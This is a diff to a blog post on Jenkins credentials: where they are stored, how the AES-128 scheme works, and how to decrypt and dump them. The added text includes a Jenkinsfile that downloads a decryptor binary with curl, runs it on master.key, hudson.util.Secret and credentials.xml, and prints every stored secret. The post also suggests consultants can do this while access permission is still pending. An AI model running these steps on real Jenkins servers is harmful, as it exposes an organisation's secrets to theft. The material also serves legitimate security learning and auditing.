@@ -12,13 +12,13 @@ Creating, accessing and dumping Jenkins credentials.
 
 Most pipelines requires secrets to authenticate with some external resources.  
 All secrets should live outside of our code repository and should be fed directly into the pipeline.   
-Jenkins offers a credentials store where we can keep our secrets and access them from jobs.
+Jenkins offers a credentials store where we can keep our secrets and access them in a couple of different ways.
 
 ## Why
 
 > Jenkins is an easy pick when it comes to intelligence gathering.
 
-To provide the best service as consultants we need all the information the client can give us.
+To provide the best service as consultants we often need all the information the client can give us.
 Sometimes the things we need to check are temporarily out of our reach.  
 We of course request permission to gain access but it can take quite awhile, and time may be of the essence.
 
@@ -260,7 +260,7 @@ Jenkins has two types of credentials: `System` and `Global`.
 
 ![](./images/2019-05-27-accessing-and-dumping-jenkins-credentials/008.png)
 
-Although most credentials are stored in `http://localhost:8080/credentials/` view, you can find additional secrets at:
+Although most credentials are stored in `http://localhost:8080/credentials/` view, you can find additional secrets in:
 1. `http://localhost:8080/configure` - some plugins create password type fields there.
 2. `http://localhost:8080/configureSecurity/` - look for AD credentials.
 
@@ -295,7 +295,7 @@ println hudson.util.Secret.decrypt("{AQAAABAAAAAgPT7JbBVgyWiivobt0CJEduLyP0lB3uy
 
 ![](./images/2019-05-27-accessing-and-dumping-jenkins-credentials/011.png)
 
-There you have it, now you can decrypt any Jenkins secrets (if you have admin privileges).
+There you have it, now you can decrypt any Jenkins secret (if you have admin privileges).
 
 Side note: if you try to run this code from a Jenkinsfile job you will get an error message:
 
@@ -306,10 +306,79 @@ Administrators can decide whether to approve or reject this signature.
 
 ## How Jenkins stores credentials
 
+Long story short to access and decrypt Jenkins credentials you need three files.
+
+Encrypted credentials are in `credentials.xml` file.
+To decrypt them you need the `master.key` and `hudson.util.Secret` files.
+
+All three files are located inside Jenkins home directory:
+
+    $JENKINS_HOME/credentials.xml 
+    $JENKINS_HOME/secrets/master.key
+    $JENKINS_HOME/secrets/hudson.util.Secret
+
+Because Jenkins is open source, someone already reverse engineered the encryption and decryption procedure.
+If you are interested in the details read this fascinating [blog][3]
+
+Secrets are encrypted in `credentials.xml` using `AES-128` with `hudson.util.Secret` as the key then `base64` encoded.  
+`hudson.util.Secret` binary file is encrypted itself with `master.key`.  
+`master.key` is stored in plain text.
+
 ## Decrypting and dumping credentials
+
+There are existing tools to decrypt Jenkins secrets.
+The one I found are in python, like this [one][4].  
+I would include the source code here but unfortunately that repository does not have a license.
+
+Python cryptography module is not included in the python standard library, it has to be installed as dependency.
+Because I don't want to deal with python runtime and external dependencies I wrote my own decryptor in Go.
+Go binaries are self contained and requires only the kernel to run.
+
+Side note: Jenkins is using `AES-128-ECB` algorithm which is not included in the Go standard library.
+That algorithm was deliberately excluded from the library in 2009 to discourage people from using it.
+
+Source code for this tool is [here][5].
+To see it in action run job `131-dumping-credentials` using the following Jenkinsfile:
+
+```groovy
+pipeline {
+  agent any
+  stages {
+
+    stage('Dump credentials') {
+      steps {
+        script {
+           sh '''
+             curl -L \
+               "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/0.0.5-alpha/jenkins-credentials-decryptor_0.0.5-alpha_$(uname -s)_$(uname -m)" \
+                -o jenkins-credentials-decryptor
+
+             chmod +x jenkins-credentials-decryptor
+             
+             ./jenkins-credentials-decryptor \
+               -m $JENKINS_HOME/secrets/master.key \
+               -s $JENKINS_HOME/secrets/hudson.util.Secret \
+               -c $JENKINS_HOME/credentials.xml 
+           '''
+        }
+      }
+    }
+
+  }
+}
+```
+
+![](./images/2019-05-27-accessing-and-dumping-jenkins-credentials/012.png)
+
+![](./images/2019-05-27-accessing-and-dumping-jenkins-credentials/013.png)
+
+This tool can also be run locally (with 3 required files copied over) or on the Jenkins host via ssh.
 
 ## Prevention and best practices
 
 [0]: https://github.com/hoto/jenkinsfile-examples
 [1]: https://github.com/hoto/jenkinsfile-examples/blob/master/jenkinsfiles/130-credentials-masking.groovy 
 [2]: https://jenkins.io/doc/pipeline/steps/credentials-binding/
+[3]: http://xn--thibaud-dya.fr/jenkins_credentials.html
+[4]: https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py
+[5]: https://github.com/hoto/jenkins-credentials-decryptor
